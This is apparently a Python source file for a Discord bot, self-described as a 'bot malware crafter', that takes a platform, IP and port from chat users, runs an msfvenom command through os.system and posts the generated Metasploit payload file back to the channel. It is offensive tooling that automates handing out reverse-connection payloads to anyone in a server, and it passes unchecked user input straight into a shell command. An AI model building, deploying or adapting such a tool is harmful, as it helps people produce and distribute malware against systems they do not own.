from discord import Game
from discord.ext.commands import Bot
from modules import msfcraft
from modules import logger
from modules import menu

import os

BOT_PREFIX = ("#", "$")
TOKEN = "" #ENTER YOUR TOKEN 

client = Bot(command_prefix=BOT_PREFIX)

@client.command(name='create',
                description="msfvenom discord bot.",
                brief="[*] Create a metasploit payload.",
                aliases=['createpayload', 'msfvenom', 'createmsf'],
                pass_context=True)

async def create(context, plat, ip, port):
    try:
        response = context.message.author.mention +" want create a "+plat+" payload to "+ip
        msfC = msfcraft.msfCrafting(plat, ip, port)
        wlog = logger.logInfo()
        await client.say(response)
        wlog.writeLog(response)
        msfC.run()
        os.system(msfC.getPayloadCmd())
        await client.say(response)
        await client.send_file(context.message.channel, msfC.getPayloadFile())
    except Exception as e:
        print (e)

@client.command(name='helpme',
                description="a better help message than this.",
                brief="[*] Shows detailed help.",
                aliases=['hh', 'helpmeplease', 'wtfisthisshit'],
                pass_context=True)

async def helpme():
    try:
        advHelp = menu.botMenus()
        await client.say(advHelp.getMenu())
    except Exception as e:
        print (e)

@client.event
async def on_ready():
    await client.change_presence(game=Game(name="bot malware crafter"))
    print (client.user.name)

client.run(TOKEN)
